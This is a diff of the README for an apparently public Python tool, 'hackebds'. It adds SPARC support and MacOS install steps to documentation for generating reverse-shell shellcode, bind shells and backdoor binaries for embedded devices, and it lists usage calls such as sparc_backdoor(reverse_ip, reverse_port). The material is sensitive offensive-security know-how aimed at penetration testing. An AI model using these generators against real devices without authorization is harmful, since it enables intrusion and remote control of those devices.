@@ -1,7 +1,8 @@
 # hackebds
 ![PyPI - Downloads](https://img.shields.io/pypi/dm/hackebds)![PyPI - Wheel](https://img.shields.io/pypi/wheel/hackebds)![PyPI - Python Version](https://img.shields.io/pypi/pyversions/pwntools)
 
-​:link:​[中文readme](https://github.com/doudoudedi/hackEmbedded/blob/main/readme_cn.md)
+:link:[中文readme](https://github.com/doudoudedi/hackEmbedded/blob/main/readme_cn.md)
+
 ## foreword
 
 >In the process of penetration and vulnerability mining of embedded devices, many problems have been encountered. One is that some devices do not have telnetd or ssh services to obtain an interactive shell，Some devices are protected by firewall and cannot be connected to it in the forward direction Reverse_shell is required, and the other is that memory corruption vulnerabilities such as stack overflow are usually Null bytes are truncated, so it is more troublesome to construct reverse_shellcode, so this tool was developed to exploit the vulnerability. This tool is developed based on the PWN module and currently uses the python2 language，**Has been updated to python3**
@@ -10,9 +11,9 @@
 
 This tool is embedded in the security test of the device. There are two main functions:
 
-1.  Generate **backdoor programs** of various architectures. The backdoor program is packaged in shellless pure shellcode and is smal，Pure static backdoor .**Armv5, Armv7, Armv8, mipsel, mips，mips64，powerpc, powerpc64 are now supported, and they are still being updated**
+1.  Generate **backdoor programs** of various architectures. The backdoor program is packaged in shellless pure shellcode and is smal，Pure static backdoor .**Armv5, Armv7, Armv8, mipsel, mips，mips64，powerpc, powerpc64，sparc  are now supported, and they are still being updated**
 
-2.  Generate **reverse_shell shellcode** of various architectures during the exploit process, and no null bytes, which facilitates the exploitation of memory corruption vulnerabilities on embedded devices. **Armv5, Armv7, Armv8, mipsel, mips, mips64, mips64el, powerpc, powerpc64 are now supported, and they are still being updated**
+2.  Generate **reverse_shell shellcode** of various architectures during the exploit process, and no null bytes, which facilitates the exploitation of memory corruption vulnerabilities on embedded devices. **Armv5, Armv7, Armv8, mipsel, mips, mips64, mips64el, powerpc, powerpc64，sparc  are now supported, and they are still being updated**
 
 3.  Fixed some bugs that the reverse_shellcode and reverse_backdoor **ports were selected too big**, and **added the function of generating bindshell with specified ports and passwords under x86 and x64**，**and beautified the generation process****（This feature will be updated to various architectures）**
     Add support armvelv7_bind_shell(2022.10.27)，
@@ -27,14 +28,19 @@ This tool is embedded in the security test of the device. There are two main fun
 
 8.  Improved x86, x64, armebv5, reverse_ shellcode and reverse_ shell_ file
 
+9.  Improved the file generation process, directory designation and file replacement
+
+10.  Improved support for MacOS systems
+
 ## install
 
 pip download
+
 ```
 pip install -U hackebds
 ```
 
-![image-20221107231221043](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221107231221043.png)
+![image-20221121142622451](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221121142622451.png)
 
 #### Instructions for use
 
@@ -42,12 +48,18 @@ When importing this module will import the pwn module
 
 ![image-20221118202002242](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221118202002242.png)
 
+
+
 Please install the corresponding binutils environment before use
 expample:
 
 ```
-apt search binutils | grep arm（You can replace it here）
-apt install binutils-arm-linux-gnueabi/hirsute
+Ubuntu:
+  apt search binutils | grep arm（You can replace it here）
+  apt install binutils-arm-linux-gnueabi/hirsute
+ MacOS:
+ 	 https://github.com/Gallopsled/pwntools-binutils
+ 	 brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/master/osx/binutils-$ARCH.rb
 ```
 
 1. Use the command line to generate the backdoor file name, shellcode, binshell, etc
@@ -84,6 +96,7 @@ apt install binutils-arm-linux-gnueabi/hirsute
 >>> mips64el_backdoor(reverse_ip,reverse_port)
 >>> x86el_backdoor(reverse_ip,reverse_port)
 >>> x64el_backdoor(reverse_ip, reverse_port)
+>>> sparc_backdoor(reverse_ip, reverse_port)#big endian
 >>> powerpc_backdoor(reverse_ip, reverse_port)
 >>> powerpcle_backdoor(reverse_ip, reverse_port)
 >>> powerpc64_backdoor(reverse_ip, reverse_port)
@@ -173,8 +186,6 @@ example:
    
    ```
 
-## 
-
 ## chips and architectures
 
 Tests can leverage chips and architectures
@@ -216,10 +227,13 @@ Qualcomm Snapdragon 660
  2022.11.2 Support command line generation backdoor and shell code, characterized by light, small, efficient and fast
 
 ## vul fix
+
+
 CVE-2021-29921 The tool is a complete client program. This vulnerability will not affect the use of the tool. If you want to fix it, please run the tool in python 3.9 and above
 
-CVE-2022-40023 DOS_attack pip install -U  mako
+CVE-2022-40023 DOS_attack pip install -U  mako (The vulnerability does not apply to this tool)
 
-CVE-2021-20270 DOS_attack pip install -U  pygments
+CVE-2021-20270 DOS_attack pip install -U  pygments (The vulnerability does not apply to this tool)
 
+ 0.2.5 Version Repair directory traversal in the specified model
 
